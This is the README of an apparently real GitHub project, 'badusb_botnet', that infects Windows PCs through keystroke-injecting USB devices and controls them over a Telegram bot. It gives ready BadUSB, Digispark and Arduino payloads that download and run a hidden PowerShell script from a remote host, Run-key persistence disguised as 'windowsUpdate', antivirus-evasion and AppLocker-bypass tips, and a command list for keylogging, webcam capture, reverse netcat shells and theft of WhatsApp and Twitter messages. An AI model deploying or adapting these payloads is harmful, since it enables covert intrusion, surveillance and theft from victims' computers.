# badusb_botnet
https://github.com/alexfrancow/badusb_botnet
:smiling_imp::busts_in_silhouette: Infect a pc with badusb and establish a connection through telegram.

[![](https://img.shields.io/badge/twitter-@alexfrancow-00aced?style=flat-square&logo=twitter&logoColor=white)](https://twitter.com/alexfrancow) [![](https://img.shields.io/badge/linkedin-@alexfrancow-0084b4?style=flat-square&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/alexfrancow)

# Configuration

```powershell
############
## CONFIG ##
############

$BotToken = "<BOTTOKEN>"
$ChatID = '<CHATID>'
$githubScript = '<you_fork/poc.ps1>'
```
>*To create a telegram bot: https://core.telegram.org/bots#6-botfather*

>*To get ChatID: https://stackoverflow.com/questions/32423837/telegram-bot-how-to-get-a-group-chat-id*

## Option 1: Powershell

<p align="center">
    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/PowerShell_5.0_icon.png" height="100px" width="100px"/>
</p>

### Option 1.1: Simple

```powershell
> [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
> (new-object net.webclient).DownloadFile('https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1','poc.ps1')
> powershell.exe -windowstyle hidden -file poc.ps1
```

```
DELAY 3000
GUI r
DELAY 500
STRING powershell
DELAY 500
ENTER
DELAY 750
STRING [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
DELAY 500
ENTER
STRING (new-object net.webclient).DownloadFile('https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1','poc.ps1')
DELAY 500
ENTER
STRING powershell.exe -windowstyle hidden -file poc.ps1
DELAY 500
ENTER
```

> Link to convert to .ino: https://malduino.com/converter/

### Option 1.2: Backdoor

```powershell
> reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /f
> Invoke-WebRequest -Uri https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1 -OutFile C:\Users\$env:username\Documents\windowsUpdate.ps1
> reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /t REG_SZ /d "powershell.exe -windowstyle hidden -file C:\Users\$env:username\Documents\windowsUpdate.ps1"
```
```
DELAY 3000
GUI r
DELAY 500
STRING powershell
DELAY 500
ENTER
DELAY 750
STRING reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /f
DELAY 500
ENTER
STRING Invoke-WebRequest -Uri https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1 -OutFile C:\Users\$env:username\Documents\windowsUpdate.ps1
DELAY 500
ENTER
STRING reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /t REG_SZ /d "powershell.exe -windowstyle hidden -file C:\Users\$env:username\Documents\windowsUpdate.ps1"
DELAY 500
ENTER
```

> Link to convert to .ino: https://malduino.com/converter/

## Option 2: CMD

<p align="center">
    <img src="https://winaero.com/blog/wp-content/uploads/2015/09/console-cmd-icon.png" height="100px" width="100px"/>
</p>

Windows Powershell is too slow at startup, so we can use cmd to download the '.ps1' file and execute it. To download a file with cmd, we can use two options: ```bitsadmin``` or ```certutil.exe```. (Certutil is not installed by default on XP/Win2003 but is avaialble on the newer windows versions. For XP/2003 you'll need the Admin Tool Pack for windows server 2003).

#### Syntax

```cmd
> bitsadmin /transfer myDownloadJob /download /priority normal http://downloadsrv/10mb.zip c:\10mb.zip
> certutil.exe -urlcache -split -f "https://download.sysinternals.com/files/PSTools.zip" pstools.zip
```
### Option 2.1: Simple

```cmd
> certutil.exe -urlcache -split -f "https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1" "Documents/windowsUpdate.ps1"
> powershell Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted
> powershell.exe -windowstyle hidden -file "Documents/windowsUpdate.ps1"
```

or

```cmd
> certutil.exe -urlcache -split -f "https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1" "Documents/windowsUpdate.ps1"
> powershell.exe -windowstyle hidden -executionPolicy bypass -file "Documents/windowsUpdate.ps1"
```

> Avast detects this last option.

### Option 2.2: Backdoor

```cmd
> certutil.exe -urlcache -split -f "https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1" Documents\windowsUpdate.ps1
> powershell Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted
> reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /t REG_SZ /d "powershell.exe -windowstyle hidden -file C:\Users\$env:username\Documents\windowsUpdate.ps1"
> reboot (?)
```

## Example with digispark

<p align="center">
    <img src="https://img.staticbg.com/thumb/large/oaupload/banggood/images/78/0D/5586c82c-2791-44cf-baa6-3ebc5882ac2e.jpg" height="100px" width="100px"/>
</p>

```c
#define kbd_es_es
#include "DigiKeyboard.h"
void setup() {
}

void loop() {
DigiKeyboard.sendKeyStroke(0);
DigiKeyboard.delay(500);
DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
DigiKeyboard.delay(500);
DigiKeyboard.print("powershell -noe -c \". mode.com con: lines=1 cols=40\"");
//DigiKeyboard.print("cmd");
//DigiKeyboard.print("cmd /k mode con:cols=20 lines=1");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(3000);
DigiKeyboard.print("Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(200);
DigiKeyboard.print("S");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(500);
DigiKeyboard.print("[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(500);
DigiKeyboard.print("(new-object net.webclient).DownloadFile('https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1','poc.ps1')");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(500);
DigiKeyboard.print("powershell.exe -windowstyle hidden -file poc.ps1");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
for (;;) {
/*empty*/
    }
}
```

- Get the drivers: https://github.com/digistump/DigistumpArduino/releases

- Additional Board Manager URL: https://raw.githubusercontent.com/digistump/arduino-boards-index/master/package_digistump_index.json

- DigiKeyboard Source Code: https://github.com/digistump/DigisparkArduinoIntegration/blob/master/libraries/DigisparkKeyboard/DigiKeyboard.h

> Keyboard en_US to es_ES: https://github.com/ernesto-xload/DigisparkKeyboard
Decompress the archive and put all in : ```C:\Users\Administrador\AppData\Local\Arduino15\packages\digistump\hardware\avr\1.6.7\libraries\DigisparkKeyboard```, later in the script you must put the following line to specify the keyboard layout.
```c
#define kbd_es_es
```

## Example with ATMega32u4

<p align="center">
    <img src="https://steemitimages.com/DQmbXKQU5FScuc9bdhPjjVwBbFy4EK7LuTFtnMe7vEjV7W7/badusb.png" height="100px" width="150px"/>
</p>

> First, we need put the keyboard.h library in es_ES, to do this you can copy the Keyboard directory of this project into: 
"C:\Program Files (x86)\Arduino\libraries".

```c
#include <Keyboard.h>

void setup() {
  Keyboard.begin(); //Start keyboard communication
  delay(3000);
  Keyboard.press(KEY_LEFT_GUI);
  delay(500);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);

  Keyboard.println("cmd");
  delay(500);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();

  Keyboard.println("certutil.exe -urlcache -split -f \"https://raw.githubusercontent.com/alexfrancow/poc/master/poc.ps1\" \"Documents/poc.ps1\"");
  delay(500);
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);

  Keyboard.println("powershell Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted");
  delay(500);
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);

  Keyboard.println("powershell.exe -windowstyle hidden -file \"Documents/poc.ps1\"");
  delay(500);
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
}
void loop() {
}
```

We use the ```\"``` to scape the double quotes in Arduino code.

### Example with bitsadmin

```c
Keyboard.println(" bitsadmin /transfer \"Descargando Drivers USB\" /download /priority high \"https://raw.githubusercontent.com/alexfrancow/poc/master/poc.ps1\" %TEMP%/poc.ps1 && echo Instalando Drivers: ");
```

## Evade AVs

### Obfuscating Binary Names
#### For Loop Value Extraction

```FOR /F “delims=s\ tokens=4” %a IN (‘set^|findstr PSM’)DO %a```

Example:
```c
Keyboard.println(" FOR /F \"delims=/ tokens=1\" %a IN ('where certutil')DO %a -urlcache -split -f \"https://raw.githubusercontent.com/alexfrancow/poc/master/poc.ps1\" \"Documents/poc.ps1\" ");
```

## Bypass AppLocker

Policies of AppLocker are stored in ```HKEY_LOCAL_Machine\Software\Policies\Microsoft\Windows\SrpV2```, You can verify the folders in which you have permission to run .ps1 scripts.

### Telegram Options

#### Basic

- /list (List all devices availables)
- /select ```IP``` ```command``` (Execute a command)
- /stop ```IP``` (Stop remote connection)
- /cleanAll ```IP``` (Clean all files)
- /ipPublic ```IP``` (Geolocate IP)
- /download ```IP``` ```file``` (Download a file from PC)

#### Advanced

- /screenshot ```IP``` (Capture screen)
- /backdoor ```IP``` (Create a persistent backdoor)
- /webcam ```IP```
- /keylogger ```IP``` ```time in seconds```
- <img src="http://icons-for-free.com/free-icons/png/512/298878.png" width="24px" height="24px" /> /nc ```IP``` ```IP to connect ($ip)``` (First you must use ```nc -lp 8888 -v``` to create a listener)
- <img src="http://icons-for-free.com/free-icons/png/512/298878.png" width="24px" height="24px" /> /stopnc ```IP``` (Stop nc.exe and erase all archives) 

#### Ultra :squirrel: 

- /hackT ```IP``` (Get Twitter messages if the victim is authenticated) [Only web - W10]
- /hackW ```IP``` (Get WhatsApp messages if the victim is authenticated) [Only Web - W10]
- <img src="https://static-cdn.jtvnw.net/emoticons/v1/112290/1.0" width="24px" height="24px" />  /starttwitch ```IP``` ```STREAM_KEY``` (Start a video transmission on Twitch with ffmpeg)
- <img src="https://static-cdn.jtvnw.net/emoticons/v1/112290/1.0" width="24px" height="24px" />  /stoptwitch ```IP``` (Stop ffmpeg.exe and erase all archives) 

### PoCs

:link::tv: [TOUR - POC](https://youtu.be/pFR8B0HNfts "TOUR - POC")

:link::tv: [TWITCH STREAMING - POC](https://youtu.be/3GBIVNhHT0Y "TWITCH STREAMING - POC")

:link::tv: [KEYLOGGER - POC](https://youtu.be/f6JCPnsyGp0 "KEYLOGGER -POC")

:link::tv: [DIGISPARK - POC](https://youtu.be/ojcYAvVuBSw "DIGISPARK -POC")

##### {TODO}

- Change all Invoke-WebRequest to cURL. (Invoke-WebRequest requires set up Internet Explorer)
- Create an ID for each connected user.
- Hack WhatsApp on .exe.
- :heavy_check_mark: Fix Twitch streaming.
- :heavy_check_mark: Fix keylogger.
- Add monitor selector to screenshot.
- Add windows version detector in HackTwitterW10() and hackWhatsAPPW10() functions.
- Add hackGmail().
- :heavy_check_mark: Verbose via telegram messages.
- :heavy_check_mark: Netcat reverse connection.
